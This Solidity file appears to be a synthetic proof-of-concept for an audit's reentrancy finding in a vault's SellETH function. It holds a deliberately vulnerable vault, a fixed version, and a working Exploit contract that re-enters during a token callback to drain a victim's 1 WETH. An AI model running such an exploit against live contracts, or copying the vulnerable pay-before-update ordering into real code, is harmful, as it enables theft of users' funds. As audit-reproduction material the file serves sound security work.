// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  TRZN VaultETH.SellETH — Ether is sent to the risk manager before shares
    move, and SellETH has no nonReentrant modifier (Zokyo, finding 37229).

    SYNTHETIC, cheatcode-free reduction. The vault holds 2 WETH of shares.
    The attacker owns 1. SellETH pays the risk manager, who reenters and is
    paid again before the share balance drops. The victim's 1 WETH is taken.

    run() does not warp. */

contract WETH {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (to.code.length > 0) {
            IRisk(to).onETH(amount);
        }
        return true;
    }
}

interface IRisk {
    function onETH(uint256 amount) external;
}

contract VaultETH {
    WETH public weth;
    address public riskManager;
    mapping(address => uint256) public shares;
    uint256 public sold;

    constructor(WETH weth_, address riskManager_) {
        weth = weth_;
        riskManager = riskManager_;
    }

    function credit(address user, uint256 amount) external {
        shares[user] += amount;
    }

    function SellETH(uint256 amount) external {
        require(shares[msg.sender] >= amount, "shares");
        // @> VULN: Ether is sent to the risk manager before shares are cleared, and SellETH is not nonReentrant
        weth.transfer(riskManager, amount);
        shares[msg.sender] = 0;
        sold += amount;
    }
}

contract VaultETHFixed {
    WETH public weth;
    address public riskManager;
    mapping(address => uint256) public shares;

    constructor(WETH weth_) {
        weth = weth_;
    }

    function setRisk(address riskManager_) external {
        require(riskManager == address(0), "risk");
        riskManager = riskManager_;
    }

    function credit(address user, uint256 amount) external {
        shares[user] += amount;
    }

    function SellETH(uint256 amount) external {
        require(shares[msg.sender] >= amount, "shares");
        shares[msg.sender] = 0;
        weth.transfer(riskManager, amount);
    }
}

contract Exploit {
    uint256 public constant VICTIM_SHARES = 1 ether;
    uint256 public constant ATTACK_SHARES = 1 ether;
    uint256 public constant STOLEN = 1 ether;

    WETH public weth;
    VaultETH public vault;
    address public victim;
    uint256 public received;
    bool internal entered;

    constructor() {
        weth = new WETH();
        vault = new VaultETH(weth, address(this));
        victim = address(0xCAFE);
        weth.mint(address(vault), VICTIM_SHARES + ATTACK_SHARES);
        vault.credit(victim, VICTIM_SHARES);
        vault.credit(address(this), ATTACK_SHARES);
    }

    function onETH(uint256) external {
        if (entered) return;
        entered = true;
        vault.SellETH(ATTACK_SHARES);
    }

    function run() external {
        vault.SellETH(ATTACK_SHARES);
        received = weth.balanceOf(address(this));
        require(received == VICTIM_SHARES + ATTACK_SHARES, "received");
        require(weth.balanceOf(address(vault)) == 0, "vault empty");
        require(vault.shares(victim) == VICTIM_SHARES, "victim shares");
        require(received - ATTACK_SHARES == STOLEN, "stolen");
    }
}
